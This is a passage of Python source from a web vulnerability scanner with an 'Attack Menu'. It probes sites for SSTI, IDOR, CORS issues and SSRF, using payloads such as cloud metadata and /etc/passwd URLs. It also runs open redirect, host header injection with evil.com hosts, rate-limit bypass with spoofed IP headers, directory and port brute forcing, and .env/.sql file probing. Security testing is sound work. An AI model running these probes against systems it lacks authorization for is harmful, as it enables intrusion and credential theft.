        self.log_finding("Testing SSTI in forms (POST data)...", "info")
        for form in self.fingerprints["forms"]:
            action = form["action"]
            method = form["method"]
            if method != "POST": continue

            for input_field in form["inputs"]:
                if input_field["type"] in ["text", "textarea"]:
                    for payload in self.payloads["ssti"]:
                        data_to_send = {i["name"]: payload if i["name"] == input_field["name"] else i["value"]
                                        for i in form["inputs"]}
                        response = self._send_request(method, action, data=data_to_send)

                        if not response: continue

                        if ssti_result_pattern in response.text:
                            self.log_finding(f"Possible SSTI detected in form '{action}' (field: {input_field['name']}) with payload: {payload}", "high")
                            ssti_found_count += 1
                            break # Move to next form field/form

        if ssti_found_count == 0:
            self.log_finding("No SSTI vulnerabilities detected.", "info")
        else:
            self.log_finding(f"SSTI scan completed. Found {ssti_found_count} SSTI vulnerabilities.", "high")


    def test_idor(self):
        """Test for Insecure Direct Object References (IDOR)."""
        self.log_finding("Starting IDOR testing...", "info")
        idor_found_count = 0

        # General approach: Try common ID patterns on discovered endpoints
        # This is highly dependent on how IDs are structured in the app.
        # A more advanced IDOR test would require understanding application logic.
        for endpoint in self.fingerprints["endpoints"]:
            # Check for numeric IDs in path
            match = re.search(r'/(\d+)/?$', endpoint)
            if match:
                original_id = int(match.group(1))
                # Try accessing adjacent IDs (e.g., -1, +1)
                for test_id in [original_id - 1, original_id + 1, 1]:
                    if test_id <= 0: continue
                    test_url = re.sub(r'/\d+/?$', f'/{test_id}/', endpoint)
                    if test_url == endpoint: continue # Avoid re-testing same URL if no change

                    response = self._send_request("GET", test_url)

                    if response and response.status_code == 200:
                        # Basic check: If the content is significantly different from original_id's content
                        # and not a generic "not found" page. This is hard to automate reliably.
                        # For now, just flag if it returns 200 for a modified ID.
                        if response.url != endpoint: # Check if redirect happened to original or a different page
                            self.log_finding(f"Possible IDOR detected by accessing ID {test_id} at {test_url} (Original: {endpoint})", "high")
                            idor_found_count += 1
                            break # Move to next endpoint

            # Test specific IDOR payloads on base URL or relevant endpoints
            for payload in self.payloads["idor"]:
                test_url = urljoin(self.target_url, payload)
                response = self._send_request("GET", test_url)

                if response and response.status_code == 200:
                    self.log_finding(f"Possible IDOR vulnerability at {test_url}", "high")
                    idor_found_count += 1
                    break # Move to next payload/endpoint

        if idor_found_count == 0:
            self.log_finding("No IDOR vulnerabilities detected.", "info")
        else:
            self.log_finding(f"IDOR scan completed. Found {idor_found_count} IDOR vulnerabilities.", "high")


    def check_http_methods(self):
        """Check for potentially dangerous HTTP methods allowed."""
        self.log_finding("Checking for dangerous HTTP methods...", "info")

        dangerous_methods = ["PUT", "DELETE", "TRACE", "CONNECT", "PATCH", "OPTIONS"] # OPTIONS is generally safe but useful for discovery
        allowed_methods = []

        # Test target_url and a few other discovered endpoints
        endpoints_to_test = list(set([self.target_url] + self.fingerprints["endpoints"][:5])) # Test base and first 5 discovered

        for url in endpoints_to_test:
            self.log_finding(f"Testing HTTP methods for: {url}", "debug")
            for method in dangerous_methods:
                try:
                    response = self._send_request(method, url)
                    if response:
                        if response.status_code in [200, 201, 204]:
                            self.log_finding(f"Method '{method}' allowed for {url} (Status: {response.status_code})", "high")
                            if method not in allowed_methods: allowed_methods.append(method)
                        elif response.status_code == 405:
                            self.log_finding(f"Method '{method}' explicitly disallowed for {url} (Status: {response.status_code})", "debug")
                        elif response.status_code in [403, 404]:
                            self.log_finding(f"Method '{method}' returned {response.status_code} for {url} - likely disallowed.", "debug")
                        else:
                            self.log_finding(f"Method '{method}' returned unexpected status {response.status_code} for {url}.", "debug")
                except Exception as e:
                    self.log_finding(f"HTTP method check error for {method} on {url}: {str(e)}", "debug")

        if allowed_methods:
            self.log_finding(f"Dangerous HTTP methods allowed: {', '.join(allowed_methods)}", "high")
        else:
            self.log_finding("No dangerous HTTP methods found allowed.", "info")

    def check_cors(self):
        """Check for misconfigured CORS policies."""
        self.log_finding("Checking CORS configuration...", "info")
        cors_found_count = 0

        # Try a known "evil" origin
        evil_origin = "https://evil.com"
        headers_with_origin = {"Origin": evil_origin}

        # Step 1: Send a simple GET request with the evil origin
        response = self._send_request("GET", self.target_url, headers=headers_with_origin)
        if response:
            if "Access-Control-Allow-Origin" in response.headers:
                acao = response.headers.get("Access-Control-Allow-Origin")
                if acao == "*":
                    self.log_finding("CORS misconfiguration: 'Access-Control-Allow-Origin' set to '*' (Universal Access)", "critical")
                    cors_found_count += 1
                elif evil_origin in acao:
                    self.log_finding(f"CORS misconfiguration: 'Access-Control-Allow-Origin' reflects arbitrary origin '{acao}'", "high")
                    cors_found_count += 1
                if "Access-Control-Allow-Credentials" in response.headers and response.headers["Access-Control-Allow-Credentials"].lower() == "true":
                    if acao == "*" or evil_origin in acao:
                        self.log_finding("CORS with credentials allowed along with 'Access-Control-Allow-Origin' set to '*' or reflecting origin - major security risk!", "critical")
                        cors_found_count += 1

        # Step 2: Send a preflight OPTIONS request
        preflight_headers = {
            "Origin": evil_origin,
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "X-Requested-With, Content-Type, Authorization"
        }
        response_options = self._send_request("OPTIONS", self.target_url, headers=preflight_headers)

        if response_options:
            if "Access-Control-Allow-Origin" in response_options.headers:
                acao_options = response_options.headers.get("Access-Control-Allow-Origin")
                if acao_options == "*":
                    self.log_finding("CORS misconfiguration (OPTIONS): 'Access-Control-Allow-Origin' set to '*' (Universal Access)", "critical")
                    cors_found_count += 1
                elif evil_origin in acao_options:
                    self.log_finding(f"CORS misconfiguration (OPTIONS): 'Access-Control-Allow-Origin' reflects arbitrary origin '{acao_options}'", "high")
                    cors_found_count += 1

            if "Access-Control-Allow-Methods" in response_options.headers:
                allowed_methods = response_options.headers.get("Access-Control-Allow-Methods", "").split(", ")
                if "PUT" in allowed_methods or "DELETE" in allowed_methods:
                    self.log_finding(f"CORS allows dangerous methods (PUT/DELETE): {allowed_methods}", "medium")

        if cors_found_count == 0:
            self.log_finding("No significant CORS misconfigurations detected.", "info")
        else:
            self.log_finding(f"CORS scan completed. Found {cors_found_count} CORS misconfigurations.", "high")


    def check_security_headers(self, initial_response=None):
        """Check for missing or misconfigured security headers."""
        self.log_finding("Checking security headers...", "info")

        response = initial_response # Use existing response if provided
        if not response:
            response = self._send_request("GET", self.target_url)
            if not response:
                self.log_finding("Could not get response to check security headers.", "warning")
                return

        security_headers_to_check = {
            "Content-Security-Policy": {"description": "Helps prevent XSS and other code injection attacks.", "severity": "critical", "check": lambda h: h and "script-src 'self'" in h.lower()},
            "X-Frame-Options": {"description": "Prevents clickjacking attacks.", "severity": "high", "check": lambda h: h and ("deny" in h.lower() or "sameorigin" in h.lower())},
            "X-XSS-Protection": {"description": "Enables XSS filtering in older browsers.", "severity": "low", "check": lambda h: h and "1; mode=block" in h.lower()},
            "X-Content-Type-Options": {"description": "Prevents MIME type sniffing.", "severity": "medium", "check": lambda h: h and "nosniff" in h.lower()},
            "Strict-Transport-Security": {"description": "Enforces HTTPS connections.", "severity": "high", "check": lambda h: h and "max-age" in h.lower() and self.scheme == "https"},
            "Referrer-Policy": {"description": "Controls referrer information in requests.", "severity": "low", "check": lambda h: h and ("no-referrer" in h.lower() or "same-origin" in h.lower() or "strict-origin-when-cross-origin" in h.lower())},
            "Permissions-Policy": {"description": "Replaces Feature-Policy, allows/disallows use of browser features.", "severity": "low", "check": lambda h: True}, # Just check for presence
            "Expect-CT": {"description": "Enforces Certificate Transparency.", "severity": "low", "check": lambda h: True},
            "Public-Key-Pins": {"description": "Pin public keys to prevent MITM (deprecated in favor of Expect-CT).", "severity": "low", "check": lambda h: True} # Still good to check for presence if older app
        }

        found_count = 0
        for header_name, details in security_headers_to_check.items():
            if header_name not in response.headers:
                self.log_finding(f"Missing security header: {header_name} - {details['description']}", details["severity"])
            else:
                header_value = response.headers[header_name]
                self.fingerprints["headers"][header_name] = header_value
                if not details["check"](header_value):
                    self.log_finding(f"Misconfigured security header: {header_name}: {header_value} - {details['description']}", details["severity"])
                else:
                    self.log_finding(f"Security header found and configured: {header_name}: {header_value}", "info")
                found_count += 1
        
        if found_count == 0:
            self.log_finding("No significant security headers detected.", "info")
        else:
            self.log_finding("Security header check completed.", "info")

    def defacement_check(self):
        """Performs a basic defacement check by comparing page content hash."""
        self.log_finding("Starting defacement check...", "info")
        try:
            response = self._send_request("GET", self.target_url)
            if not response or response.status_code != 200:
                self.log_finding(f"Could not retrieve content from {self.target_url} for defacement check. Status: {response.status_code if response else 'N/A'}", "warning")
                return

            current_hash = hashlib.sha256(response.content).hexdigest()

            if self.original_hash is None:
                self.original_hash = current_hash
                self.log_finding(f"Initial content hash recorded for {self.target_url}: {self.original_hash}", "info")
            else:
                if current_hash != self.original_hash:
                    self.log_finding(f"Potential defacement detected! Content hash changed from {self.original_hash} to {current_hash}", "critical")
                else:
                    self.log_finding("Content hash matches original. No defacement detected.", "info")
        except Exception as e:
            self.log_finding(f"Error during defacement check: {str(e)}", "debug")

    def subdomain_enumeration(self, wordlist_size=100):
        """Performs subdomain enumeration using a small wordlist and DNS queries."""
        self.log_finding(f"Starting subdomain enumeration for {self.base_domain}...", "info")
        subdomains_found = []

        # A basic wordlist for common subdomains (can be expanded)
        subdomain_wordlist = self.payloads["subdomains"]

        self.log_finding(f"Checking {len(subdomain_wordlist)} common subdomains...", "info")

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for subdomain in subdomain_wordlist:
                full_subdomain = f"{subdomain}.{self.base_domain}"
                futures.append(executor.submit(self._check_subdomain, full_subdomain))

            for future in as_completed(futures):
                result = future.result()
                if result:
                    subdomains_found.append(result)

        if subdomains_found:
            self.fingerprints["subdomains"].extend(subdomains_found)
            self.log_finding(f"Found {len(subdomains_found)} subdomains: {', '.join(subdomains_found)}", "high")
        else:
            self.log_finding("No subdomains found using common wordlist.", "info")


    def _check_subdomain(self, full_subdomain):
        """Helper for checking individual subdomains."""
        try:
            # Try a simple HTTP GET to see if it resolves and returns 200
            url = f"{self.scheme}://{full_subdomain}"
            response = self._send_request("HEAD", url, allow_redirects=True)
            if response and response.status_code == 200:
                self.log_finding(f"Subdomain discovered via HTTP: {url}", "info")
                return full_subdomain

            # Try DNS resolution directly
            answers = dns.resolver.resolve(full_subdomain, 'A')
            if answers:
                ip_addresses = [str(r) for r in answers]
                self.log_finding(f"Subdomain discovered via DNS: {full_subdomain} (IPs: {', '.join(ip_addresses)})", "info")
                return full_subdomain

        except dns.resolver.NXDOMAIN:
            self.log_finding(f"Subdomain {full_subdomain} does not exist (NXDOMAIN).", "debug")
        except dns.resolver.NoAnswer:
            self.log_finding(f"Subdomain {full_subdomain} exists but has no A record.", "debug")
        except requests.exceptions.RequestException:
            self.log_finding(f"Subdomain {full_subdomain} not reachable via HTTP.", "debug")
        except Exception as e:
            self.log_finding(f"Error checking subdomain {full_subdomain}: {str(e)}", "debug")
        return None

    def directory_bruteforce(self, wordlist_size=100):
        """Brute-forces common directories and files."""
        self.log_finding(f"Starting directory and file brute-force for {self.target_url}...", "info")
        found_paths = []

        common_paths = self.payloads["directories"]

        self.log_finding(f"Checking {len(common_paths)} common paths...", "info")

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for path in common_paths:
                full_url = urljoin(self.target_url, path)
                futures.append(executor.submit(self._check_path, full_url))

            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_paths.append(result)

        if found_paths:
            self.log_finding(f"Found {len(found_paths)} accessible directories/files: {', '.join(found_paths)}", "high")
        else:
            self.log_finding("No common directories or files found.", "info")

    def _check_path(self, url):
        """Helper for checking individual paths."""
        try:
            response = self._send_request("GET", url)
            if response and response.status_code == 200:
                # Avoid flagging generic 404 pages that return 200 (e.g., custom error pages)
                # This is a heuristic and might need fine-tuning.
                if "not found" not in response.text.lower() and "error" not in response.text.lower():
                    self.log_finding(f"Accessible path found: {url} (Status: {response.status_code})", "medium")
                    self.fingerprints["endpoints"].append(url)
                    return url
                else:
                    self.log_finding(f"Path {url} returned 200 but content suggests 'not found'.", "debug")
            elif response and response.status_code in [401, 403]:
                self.log_finding(f"Path {url} found but forbidden/unauthorized (Status: {response.status_code}).", "info")
        except Exception as e:
            self.log_finding(f"Error checking path {url}: {str(e)}", "debug")
        return None

    def port_scan(self, common_ports=None):
        """Performs a basic port scan on the target host."""
        self.log_finding(f"Starting port scan for {self.base_domain}...", "info")
        
        target_ip = None
        try:
            target_ip = socket.gethostbyname(self.base_domain)
            self.log_finding(f"Resolved {self.base_domain} to IP: {target_ip}", "info")
        except socket.gaierror as e:
            self.log_finding(f"Could not resolve host {self.base_domain}: {str(e)}", "critical")
            return

        if not common_ports:
            # Common ports for web services and related protocols
            common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3389, 8080, 8443, 9000, 3306, 5432, 27017]

        open_ports = []
        port_scan_timeout = 1 # Shorter timeout for port scanning

        with ThreadPoolExecutor(max_workers=self.max_threads * 2) as executor: # More threads for port scan
            futures = []
            for port in common_ports:
                futures.append(executor.submit(self._check_port, target_ip, port, port_scan_timeout))

            for future in as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)

        if open_ports:
            self.fingerprints["open_ports"].extend(open_ports)
            self.log_finding(f"Found {len(open_ports)} open ports: {', '.join(map(str, open_ports))}", "high")
        else:
            self.log_finding("No common open ports found.", "info")

    def _check_port(self, ip, port, timeout):
        """Helper for checking individual ports."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            result = sock.connect_ex((ip, port))
            if result == 0:
                service = "Unknown"
                try:
                    service = socket.getservbyport(port)
                except OSError:
                    pass # Service not in common list
                self.log_finding(f"Port {port} is OPEN ({service}) on {ip}", "medium")
                return port
        except Exception as e:
            self.log_finding(f"Error checking port {port} on {ip}: {str(e)}", "debug")
        finally:
            sock.close()
        return None

    def test_ssrf(self):
        """Test for Server-Side Request Forgery (SSRF) vulnerabilities."""
        self.log_finding("Starting SSRF testing...", "info")
        ssrf_found_count = 0
        
        # Internal IP addresses and common services
        internal_targets = [
            "127.0.0.1", "localhost", "169.254.169.254", # AWS EC2 metadata
            "192.168.1.1", "10.0.0.1", # Common router/internal IPs
            "file:///etc/passwd", "file:///C:/Windows/win.ini" # File read via SSRF
        ]
        
        # Look for parameters that might accept URLs or file paths
        potential_params = ["url", "image_url", "callback", "redirect", "file", "src", "link", "api", "data"]
        
        # Combine with discovered endpoints
        endpoints_to_test = list(set([self.target_url] + self.fingerprints["endpoints"]))

        for endpoint_url in endpoints_to_test:
            parsed_url = urlparse(endpoint_url)
            query_dict = {}
            if parsed_url.query:
                query_dict = dict(q.split("=") for q in parsed_url.query.split("&") if "=" in q)

            for param in potential_params:
                # If the endpoint already has this param, test it. Otherwise, add it.
                current_params = query_dict.copy()
                if param not in current_params:
                    current_params[param] = "dummy_value" # Add the parameter if not present

                for internal_target in internal_targets:
                    temp_params = current_params.copy()
                    temp_params[param] = internal_target
                    
                    test_url_get = parsed_url._replace(query=urlencode(temp_params)).geturl()
                    
                    self.log_finding(f"Testing SSRF GET: {test_url_get}", "debug")
                    response_get = self._send_request("GET", test_url_get)
                    
                    if response_get and (response_get.status_code == 200 or "root:x:" in response_get.text.lower() or "latest/meta-data" in response_get.text.lower()):
                        self.log_finding(f"Possible SSRF via GET parameter '{param}' at {test_url_get} with payload: {internal_target}", "critical")
                        ssrf_found_count += 1
                        break # Move to next param/endpoint

                    # Also test via POST forms if applicable
                    for form in self.fingerprints["forms"]:
                        action = form["action"]
                        method = form["method"]
                        if method == "POST" and any(input_field["name"] == param for input_field in form["inputs"]):
                            data_to_send = {i["name"]: internal_target if i["name"] == param else i["value"]
                                            for i in form["inputs"]}
                            self.log_finding(f"Testing SSRF POST: {action} (param: {param}, payload: {internal_target})", "debug")
                            response_post = self._send_request(method, action, data=data_to_send)
                            
                            if response_post and (response_post.status_code == 200 or "root:x:" in response_post.text.lower() or "latest/meta-data" in response_post.text.lower()):
                                self.log_finding(f"Possible SSRF via POST parameter '{param}' at {action} with payload: {internal_target}", "critical")
                                ssrf_found_count += 1
                                break # Move to next form

                if ssrf_found_count > 0:
                    break # Move to next endpoint
            if ssrf_found_count > 0:
                break # Stop testing this endpoint if SSRF found

        if ssrf_found_count == 0:
            self.log_finding("No SSRF vulnerabilities detected.", "info")
        else:
            self.log_finding(f"SSRF scan completed. Found {ssrf_found_count} SSRF vulnerabilities.", "high")

    def test_open_redirect(self):
        """Test for Open Redirect vulnerabilities."""
        self.log_finding("Starting Open Redirect testing...", "info")
        open_redirect_found_count = 0
        
        # Parameters that often lead to redirects
        redirect_params = ["next", "return", "redirect", "url", "continue", "dest"]
        
        # Combine with discovered endpoints
        endpoints_to_test = list(set([self.target_url] + self.fingerprints["endpoints"]))

        for endpoint_url in endpoints_to_test:
            parsed_url = urlparse(endpoint_url)
            query_dict = {}
            if parsed_url.query:
                query_dict = dict(q.split("=") for q in parsed_url.query.split("&") if "=" in q)

            for param in redirect_params:
                for payload in self.payloads["open_redirect"]:
                    temp_params = query_dict.copy()
                    temp_params[param] = payload
                    test_url = parsed_url._replace(query=urlencode(temp_params)).geturl()
                    
                    # Send request and observe redirects
                    try:
                        response = self._send_request("GET", test_url, allow_redirects=False)
                        
                        if response and response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get("Location")
                            if location and "google.com" in location: # Check if it redirects to our controlled payload
                                self.log_finding(f"Open Redirect detected in URL: {test_url} with payload: {payload}. Redirects to: {location}", "high")
                                open_redirect_found_count += 1
                                break # Move to next param/endpoint

                    except requests.exceptions.RequestException as e:
                        self.log_finding(f"Open Redirect test error for {test_url}: {str(e)}", "debug")
                if open_redirect_found_count > 0:
                    break # Move to next endpoint

        # Test POST forms for redirect parameters
        for form in self.fingerprints["forms"]:
            action = form["action"]
            method = form["method"]
            if method != "POST": continue

            for input_field in form["inputs"]:
                if input_field["name"] in redirect_params:
                    for payload in self.payloads["open_redirect"]:
                        data_to_send = {i["name"]: payload if i["name"] == input_field["name"] else i["value"]
                                        for i in form["inputs"]}
                        
                        try:
                            response = self._send_request(method, action, data=data_to_send, allow_redirects=False)
                            if response and response.status_code in [301, 302, 303, 307, 308]:
                                location = response.headers.get("Location")
                                if location and "google.com" in location:
                                    self.log_finding(f"Open Redirect detected in form '{action}' (field: {input_field['name']}) with payload: {payload}. Redirects to: {location}", "high")
                                    open_redirect_found_count += 1
                                    break # Move to next form

                        except requests.exceptions.RequestException as e:
                            self.log_finding(f"Open Redirect test error for form {action}: {str(e)}", "debug")
                    if open_redirect_found_count > 0:
                        break # Move to next form

        if open_redirect_found_count == 0:
            self.log_finding("No Open Redirect vulnerabilities detected.", "info")
        else:
            self.log_finding(f"Open Redirect scan completed. Found {open_redirect_found_count} vulnerabilities.", "high")

    def test_broken_auth_session(self):
        """Basic checks for broken authentication and session management issues."""
        self.log_finding("Starting Broken Authentication/Session Management checks...", "info")
        auth_issues_found = 0

        # Check for predictable session IDs (requires multiple requests and analysis, basic check for now)
        initial_response = self._send_request("GET", self.target_url)
        if initial_response and initial_response.cookies:
            for cookie in initial_response.cookies:
                if "session" in cookie.name.lower() or "auth" in cookie.name.lower():
                    # Check for lack of HttpOnly and Secure flags, already covered in _analyze_cookies
                    # But can add more complex checks here if needed
                    pass

        # Check for unauthenticated access to sensitive resources
        sensitive_paths = ["/admin", "/dashboard", "/profile", "/settings", "/user_data", "/api/users"]
        for path in sensitive_paths:
            url = urljoin(self.target_url, path)
            response = self._send_request("GET", url)
            if response and response.status_code == 200:
                if any(keyword.lower() in response.text.lower() for keyword in self.expected_keywords):
                    self.log_finding(f"Possible unauthenticated access to sensitive path: {url}", "critical")
                    auth_issues_found += 1

        # Check for default credentials (conceptual, would require a wordlist of common creds)
        # For example:
        # for form in self.fingerprints["forms"]:
        #     if "login" in form["action"].lower():
        #         for user, pw in [("admin", "admin"), ("user", "password")]:
        #             data = {i["name"]: user if i["type"] == "text" else pw if i["type"] == "password" else i["value" ] for i in form["inputs"]}
        #             response = self._send_request(form["method"], form["action"], data=data)
        #             if response and "welcome" in response.text.lower():
        #                 self.log_finding(f"Possible default credentials found on {form['action']}: {user}/{pw}", "critical")

        if auth_issues_found == 0:
            self.log_finding("No obvious Broken Authentication/Session Management issues detected.", "info")
        else:
            self.log_finding(f"Broken Authentication/Session Management scan completed. Found {auth_issues_found} issues.", "high")


    def test_rate_limiting_bypass(self, attempts=5):
        """Basic test for rate limiting bypass by changing headers/IPs."""
        self.log_finding("Starting Rate Limiting Bypass testing...", "info")
        rate_limit_found = False

        # Attempt to trigger rate limit first (e.g., repeatedly access a login or search page)
        login_forms = [f for f in self.fingerprints["forms"] if "login" in f["action"].lower()]
        target_endpoint = login_forms[0]["action"] if login_forms else self.target_url

        self.log_finding(f"Attempting to provoke rate limit on {target_endpoint}...", "info")
        initial_responses = []
        for _ in range(attempts + 2): # Send a few more requests than attempts
            response = self._send_request("GET", target_endpoint)
            if response:
                initial_responses.append(response.status_code)
            time.sleep(0.1) # Rapid fire

        if 429 in initial_responses or 403 in initial_responses or len(set(initial_responses)) > 1: # Basic check for varying responses
            self.log_finding(f"Possible rate limiting detected (status codes: {set(initial_responses)}).", "info")
            
            # Now try bypass methods
            for bypass_header in self.payloads["rate_limit_bypass"]:
                self.log_finding(f"Attempting bypass with '{bypass_header}' header...", "info")
                
                # Try with a new IP address in X-Forwarded-For etc.
                random_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                headers = {bypass_header: random_ip}
                
                bypass_responses = []
                for _ in range(attempts):
                    response = self._send_request("GET", target_endpoint, headers=headers)
                    if response:
                        bypass_responses.append(response.status_code)
                    time.sleep(0.1)

                if 200 in bypass_responses and (429 not in bypass_responses and 403 not in bypass_responses):
                    self.log_finding(f"Possible Rate Limiting Bypass detected using header '{bypass_header}' (successful status codes: {set(bypass_responses)})", "high")
                    rate_limit_found = True
                    break # Stop after first successful bypass

        if not rate_limit_found:
            self.log_finding("No obvious Rate Limiting Bypass vulnerabilities detected.", "info")
        else:
            self.log_finding("Rate Limiting Bypass scan completed.", "high")

    def test_sensitive_data_exposure(self):
        """Basic check for sensitive data exposure by looking for common file types."""
        self.log_finding("Starting Sensitive Data Exposure testing...", "info")
        
        sensitive_extensions = [".bak", ".old", ".zip", ".tar.gz", ".rar", ".sql", ".log", ".env", ".git", ".svn"]
        common_filenames = ["dump.sql", "backup.zip", "error.log", "config.bak", "index.php.bak", "web.config.bak"]

        paths_to_check = set()
        # Add target URL with common extensions
        parsed_url = urlparse(self.target_url)
        for ext in sensitive_extensions:
            paths_to_check.add(f"{parsed_url.path}{ext}")
            paths_to_check.add(f"{parsed_url.path.split('/')[-1]}{ext}") # Also try with just filename

        # Add common filenames
        for filename in common_filenames:
            paths_to_check.add(filename)
            paths_to_check.add(f"/{filename}")

        # Add extensions to existing endpoints
        for endpoint in self.fingerprints["endpoints"]:
            parsed_ep = urlparse(endpoint)
            for ext in sensitive_extensions:
                paths_to_check.add(f"{parsed_ep.path}{ext}")
                paths_to_check.add(f"{parsed_ep.path.split('/')[-1]}{ext}")

        sensitive_found_count = 0
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for path in list(paths_to_check):
                full_url = urljoin(self.target_url, path)
                futures.append(executor.submit(self._check_sensitive_path, full_url))
            
            for future in as_completed(futures):
                if future.result():
                    sensitive_found_count += 1
        
        if sensitive_found_count == 0:
            self.log_finding("No obvious sensitive data exposure detected.", "info")
        else:
            self.log_finding(f"Sensitive Data Exposure scan completed. Found {sensitive_found_count} potential exposures.", "high")

    def _check_sensitive_path(self, url):
        """Helper for checking individual sensitive paths."""
        try:
            response = self._send_request("GET", url)
            if response and response.status_code == 200:
                # Heuristic: file size > 0 and not a generic 404 page
                if response.content and len(response.content) > 100 and "not found" not in response.text.lower():
                    self.log_finding(f"Potentially exposed sensitive file: {url} (Size: {len(response.content)} bytes)", "critical")
                    return True
        except Exception as e:
            self.log_finding(f"Error checking sensitive path {url}: {str(e)}", "debug")
        return False

    def test_host_header_injection(self):
        """Test for Host Header Injection vulnerabilities."""
        self.log_finding("Starting Host Header Injection testing...", "info")
        
        # Malicious Host headers to test
        malicious_hosts = [
            "evil.com", "evil.com:8080", "evil.com@",
            f"{self.base_domain}.evil.com",
            f"{self.base_domain}.attacker.com",
            f"{self.target_url}.evil.com",
            f"{self.base_domain}@{self.base_domain}", # Bypasses if check for @
        ]
        
        hhi_found_count = 0
        for host in malicious_hosts:
            custom_headers = {"Host": host}
            response = self._send_request("GET", self.target_url, headers=custom_headers)
            
            if not response: continue
            
            # Check for reflection of the malicious host in response body or headers
            if host in response.text or (response.headers.get("Location") and host in response.headers["Location"]):
                self.log_finding(f"Host Header Injection detected: Malicious host '{host}' reflected in response. Potentially leads to cache poisoning, password resets, etc.", "high")
                hhi_found_count += 1
                break # Found one, likely vulnerable

        if hhi_found_count == 0:
            self.log_finding("No Host Header Injection vulnerabilities detected.", "info")
        else:
            self.log_finding(f"Host Header Injection scan completed. Found {hhi_found_count} vulnerabilities.", "high")


    def check_clickjacking(self):
        """Basic check for Clickjacking protection (X-Frame-Options header)."""
        self.log_finding("Starting Clickjacking protection check...", "info")
        
        response = self._send_request("GET", self.target_url)
        if not response:
            self.log_finding("Could not get response to check Clickjacking protection.", "warning")
            return

        x_frame_options = response.headers.get("X-Frame-Options")

        if x_frame_options:
            if "DENY" in x_frame_options.upper() or "SAMEORIGIN" in x_frame_options.upper():
                self.log_finding(f"Clickjacking protection (X-Frame-Options) found: {x_frame_options}", "info")
            else:
                self.log_finding(f"Clickjacking protection (X-Frame-Options) exists but might be misconfigured: {x_frame_options}", "medium")
        else:
            self.log_finding("Clickjacking vulnerability: 'X-Frame-Options' header is missing.", "critical")
            self.vulnerabilities["critical"].append("Missing X-Frame-Options header - potential Clickjacking.")

        self.log_finding("Clickjacking protection check completed.", "info")


    def run_scan(self):
        """Orchestrates the entire scanning process based on user choice."""
        self.log_finding(f"Starting initial reconnaissance for {self.target_url}", "info")

        # Initial reconnaissance and fingerprinting
        self.fingerprint_web_technologies()
        self.crawl_website()
        self.defacement_check() # Record initial hash for defacement check

        while True:
            print("\n" + "="*30 + " SanDan Attack Menu " + "="*30)
            print("1. XSS Scan")
            print("2. SQL Injection")
            print("3. RCE Test")
            print("4. File Inclusion (LFI/RFI)")
            print("5. XML External Entity (XXE) Test")
            print("6. Server-Side Template Injection (SSTI) Test")
            print("7. Insecure Direct Object Reference (IDOR) Test")
            print("8. Check HTTP Methods")
            print("9. Check CORS Policy")
            print("10. Check Security Headers (re-check)")
            print("11. Defacement Check (re-check)")
            print("12. Subdomain Enumeration")
            print("13. Directory/File Brute-Force")
            print("14. Port Scan")
            print("15. Server-Side Request Forgery (SSRF) Test")
            print("16. Open Redirect Test")
            print("17. Broken Authentication/Session Management Check (Basic)")
            print("18. Rate Limiting Bypass Test (Basic)")
            print("19. Sensitive Data Exposure Check (Basic)")
            print("20. Host Header Injection Test")
            print("21. Clickjacking Protection Check")
            print("------------------------------------------------------------")
            print("A. Run All Scans (Comprehensive)")
            print("Q. Exit")
            print("="*76)

            choice = input("Enter your choice: ").strip().upper()

            if choice == '1':
                self.scan_xss()
            elif choice == '2':
                self.test_sqli()
            elif choice == '3':
                self.test_rce()
            elif choice == '4':
                self.test_file_inclusion()
            elif choice == '5':
                self.test_xxe()
            elif choice == '6':
                self.test_ssti()
            elif choice == '7':
                self.test_idor()
            elif choice == '8':
                self.check_http_methods()
            elif choice == '9':
                self.check_cors()
            elif choice == '10':
                self.check_security_headers()
            elif choice == '11':
                self.defacement_check()
            elif choice == '12':
                self.subdomain_enumeration()
            elif choice == '13':
                self.directory_bruteforce()
            elif choice == '14':
                self.port_scan()
            elif choice == '15':
                self.test_ssrf()
            elif choice == '16':
                self.test_open_redirect()
            elif choice == '17':
                self.test_broken_auth_session()
            elif choice == '18':
                self.test_rate_limiting_bypass()
            elif choice == '19':
                self.test_sensitive_data_exposure()
            elif choice == '20':
                self.test_host_header_injection()
            elif choice == '21':
                self.check_clickjacking()
            elif choice == 'A':
                self.log_finding("Running all comprehensive scans...", "info")
                self.scan_xss()
                self.test_sqli()
                self.test_rce()
                self.test_file_inclusion()
                self.test_xxe()
                self.test_ssti()
                self.test_idor()
                self.check_http_methods()
                self.check_cors()
                self.check_security_headers()
                self.defacement_check() # Re-run after other scans
                self.subdomain_enumeration()
                self.directory_bruteforce()
                self.port_scan()
                self.test_ssrf()
                self.test_open_redirect()
                self.test_broken_auth_session()
                self.test_rate_limiting_bypass()
                self.test_sensitive_data_exposure()
                self.test_host_header_injection()
                self.check_clickjacking()
            elif choice == 'Q':
                self.log_finding("Exiting SanDan Security Agent.", "info")
                break
            else:
                print("Invalid choice. Please select a valid option from the menu.")

        self.generate_report()

    def generate_report(self):
        """Generates a summary report of the scan findings in JSON format."""
        report_filename = f"sandan_report_{self.base_domain}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        # Prepare vulnerabilities for report (remove duplicates)
        vulnerabilities_cleaned = {
            level: list(set(msgs)) for level, msgs in self.vulnerabilities.items()
        }

        report_data = {
            "target_url": self.target_url,
            "scan_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "agent_version": self.VERSION,
            "technologies_detected": list(set(self.technologies)), # Ensure unique
            "fingerprints": {
                "headers": self.fingerprints["headers"],
                "pages_crawled": len(self.fingerprints["pages"]),
                "forms_found": len(self.fingerprints["forms"]),
                "unique_endpoints": len(self.fingerprints["endpoints"]),
                "subdomains_found": self.fingerprints["subdomains"],
                "open_ports_found": self.fingerprints["open_ports"]
            },
            "vulnerabilities_summary": {
                "critical_count": len(vulnerabilities_cleaned["critical"]),
